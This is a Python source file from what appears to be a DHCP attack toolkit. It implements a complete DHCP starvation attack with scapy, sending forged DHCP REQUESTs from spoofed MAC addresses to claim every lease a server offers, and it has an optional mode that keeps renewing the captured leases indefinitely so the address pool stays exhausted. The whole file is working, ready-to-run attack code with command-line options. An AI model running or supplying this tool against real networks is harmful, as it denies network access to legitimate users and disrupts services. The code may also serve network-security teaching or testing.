# attacks/starvation.py
import threading
import time
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, send
from common.packet_utils import random_xid, mac_str_to_bytes
from attacks.BaseDHCPAttack import BaseDHCPAttack


class StarvationAttack(BaseDHCPAttack):
    """
    DHCP Starvation with full DORA completion.
    Not just DISCOVER flooding — sniffs OFFERs and completes
    REQUEST so the server actually commits (ACKs) each lease.
    """

    def __init__(self, iface, rate=0.1, max_leases=None, exhaustion_timeout=5.0, logger=None, maintain=False):
        super().__init__(iface, rate, max_leases, exhaustion_timeout, logger)
        self.maintain = maintain
        # ack_received is already tracked by the base class and is the
        # right progress measure here — full DORA, so leave _cap_stat_key
        # at its default ("ack_received").
        self.stats["request_sent"] = 0
        self.stats["renewals_sent"] = 0
        self._pending = {}
        self._active_leases = {}  # Maps mac -> {ip, server, lease_time, acquired_at (monotonic)}
        # Separate from self.stopped on purpose: self.stopped only becomes
        # True on Ctrl+C (the whole attack ending), but maintenance mode is
        # meant to keep running after land-grab finishes, with self.stopped
        # still False. This flag marks "land-grab is over, stop chasing new
        # OFFERs with REQUESTs" independently of that.
        self._land_grab_done = False

    def _send_renewal(self, mac, lease):
        client_ip = self._active_leases[mac]["ip"]
        server_ip = self._active_leases[mac]["server"]
        xid = lease.get("xid", random_xid())

        pkt = (
            IP(src=client_ip, dst=server_ip)
            / UDP(sport=68, dport=67)
            / BOOTP(
                op=1,
                chaddr=mac_str_to_bytes(mac),
                ciaddr=client_ip,  # Client IP הנוכחי של הלקוח
                xid=xid,
                flags=0,  # 0 = Unicast
            )
            / DHCP(
                options=[
                    ("message-type", "request"),
                    (
                        "client_id",
                        b"\x01" + mac_str_to_bytes(mac),
                    ),  # מומלץ לכלול client-id
                    "end",
                ]
            )
        )

        # L3 send(), not sendp(): the packet above has no Ether() layer, so
        # sendp() (raw L2) would have put the first 14 bytes of the IP
        # header out as a bogus "Ethernet header". send() hands it to the
        # kernel's routed IP socket instead, which resolves the real
        # next-hop MAC via ARP and prepends a correct Ethernet frame — we
        # don't track the server's MAC anywhere, so this is also the only
        # option that doesn't require capturing it.
        send(pkt, verbose=0)

        self.stats["request_sent"] += 1
        self.logger.info(
            "RENEWAL (Unicast) sent to %s for IP=%s MAC=%s",
            server_ip,
            client_ip,
            mac,
        )
        # (no sleep here — _maintenance_loop already paces itself with its
        # own 1s sleep per pass; sleeping again per-renewal would serialize
        # and compound delays when several leases need renewal in one pass)

    def run(self):
        self.logger.info(
            "Starting DHCP Starvation (full DORA) on %s (rate=%s, max_leases=%s, exhaustion_timeout=%ss)",
            self.iface, self.rate, self.max_leases, self.exhaustion_timeout,
        )
        self._last_offer_at = time.monotonic()

        sniff_thread = threading.Thread(target=self._sniff_offers, daemon=True)
        sniff_thread.start()

        self._land_grab()
        self._land_grab_done = True

        if self.maintain:
            self.logger.info("Entering maintenance mode — renewing leases until Ctrl+C")
            self._maintenance_loop()   # רץ עד self.stopped בלבד

        self.print_summary()

    def _send_request(self, client_mac, offered_ip, server_ip, xid):
        pkt = (
            Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac_str_to_bytes(client_mac), xid=xid, flags=0x8000) /
            DHCP(options=[
                ("message-type", "request"),
                ("requested_addr", offered_ip),  # Option 50
                ("server_id", server_ip),        # Option 54
                "end",
            ])
        )
        sendp(pkt, iface=self.iface, verbose=0)
        self.stats["request_sent"] += 1
        self.logger.info("REQUEST sent — claiming %s for MAC=%s", offered_ip, client_mac)

    def _maintenance_loop(self):
        while not self.stopped:
            now = time.monotonic()
            for mac, lease in list(self._active_leases.items()):
                lease_time = lease.get("lease_time")
                if not lease_time:
                    continue  # no lease_time option from server — can't compute T1, skip
                T1 = lease_time * 0.5
                if now - lease["acquired_at"] >= T1:
                    self.logger.info("Renewing lease for MAC=%s IP=%s", mac, lease["ip"])
                    self._send_renewal(mac, lease)
                    self.stats["renewals_sent"] += 1
                    lease["acquired_at"] = now  # reset T1 window after renewing
            time.sleep(1.0)  # בדיקה כל שנייה מספיקה

    def _on_offer(self, offered_ip, server_ip, client_mac, xid):
        self._last_offer_at = time.monotonic()
        if self._land_grab_done:
            self.logger.debug("Ignoring late OFFER (land-grab already done) — xid=%s", hex(xid))
            return

        self._pending[xid] = {"mac": client_mac, "ip": offered_ip}

        self.logger.debug(
            "Captured OFFER — xid=%s ip=%s server=%s mac=%s",
            hex(xid), offered_ip, server_ip, client_mac,
        )
        self._send_request(client_mac, offered_ip, server_ip, xid)

    def _on_ack(self, packet, dhcp_options, xid):
        if xid in self._pending:
            info = self._pending.pop(xid)
            self.logger.info("Lease CONFIRMED — ip=%s mac=%s", info["ip"], info["mac"])
            self._active_leases[info["mac"]] = {
                "ip": info["ip"],
                "server": packet[IP].src,
                # monotonic, not wall-clock: _maintenance_loop compares this
                # against time.monotonic(), so it must be the same clock.
                "lease_time": dhcp_options.get("lease_time"),
                "acquired_at": time.monotonic(),
            }

    def _on_nak(self, packet):
        server_ip = packet[IP].src
        nak_reason = "No reason provided by server"
        for opt in packet[DHCP].options:
            if isinstance(opt, tuple) and opt[0] == "error_message":
                nak_reason = opt[1].decode("utf-8", errors="ignore")

        info = self._pending.pop(packet[BOOTP].xid, None)
        self.logger.warning("DHCPNAK from %s — xid=%s reason=%s", server_ip, hex(packet[BOOTP].xid), nak_reason)
        if info:
            self.logger.warning("  Failed: MAC=%s Requested_IP=%s", info["mac"], info["ip"])

    # --- CLI integration ---

    @classmethod
    def configure_parser(cls, parser):
        parser.add_argument("--rate", type=float, default=0.1,
                             help="Seconds between DISCOVER packets (default: 0.1)")
        parser.add_argument("--max-leases", type=int, default=None,
                             help="Stop after this many confirmed ACKs (default: unlimited)")
        parser.add_argument("--exhaustion-timeout", type=float, default=5.0,
                             help="Stop after this many seconds with no OFFER at all "
                                  "— signals pool exhaustion (default: 5.0, 0 to disable)")
        parser.add_argument("--maintain", action="store_true",
                             help="After land-grab finishes, keep renewing captured leases "
                                  "(RFC 2131 T1/50%% unicast RENEWING) so they never expire "
                                  "back into the pool. Runs until Ctrl+C.")

    @classmethod
    def from_args(cls, args):
        timeout = args.exhaustion_timeout if args.exhaustion_timeout > 0 else None
        return cls(iface=args.iface, rate=args.rate, max_leases=args.max_leases,
                   exhaustion_timeout=timeout, maintain=args.maintain)
